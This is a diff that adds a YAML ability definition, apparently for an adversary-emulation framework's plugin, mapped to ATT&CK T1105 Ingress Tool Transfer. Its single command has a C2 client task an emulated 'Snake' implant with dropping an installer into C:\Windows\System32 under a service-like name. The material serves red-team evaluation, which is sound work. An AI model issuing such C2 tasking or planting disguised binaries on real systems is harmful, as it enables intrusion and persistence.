@@ -1,0 +1,37 @@
+- tactic: command-and-control
+  technique_name: Ingress Tool Transfer
+  technique_id: T1105
+  name: Download 3rd Snake installer to the file server (Adversary)
+  description: 'Task Snake to download the 3rd Snake installer to the file server.
+
+    '
+  executors:
+  - name: sh
+    platform: linux
+    command: './evalsC2client.py --set-and-complete-task #{second.snake.id} ''{"type":
+      4, "file": "installer_v3.exe", "dest":"C:\\Windows\\System32\\cmu_svc.exe"}''
+      --task-wait-timeout 60'
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements:
+  - module: plugins.emu.app.requirements.check_registered
+    relationship_match:
+    - source: second.snake.id
+  privilege: ''
+  repeatable: false
+  buckets:
+  - commmand-and-control
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: emu
+  delete_payload: true
+  id: 095324d9-a6e8-4964-a5ba-92fff6907c2e
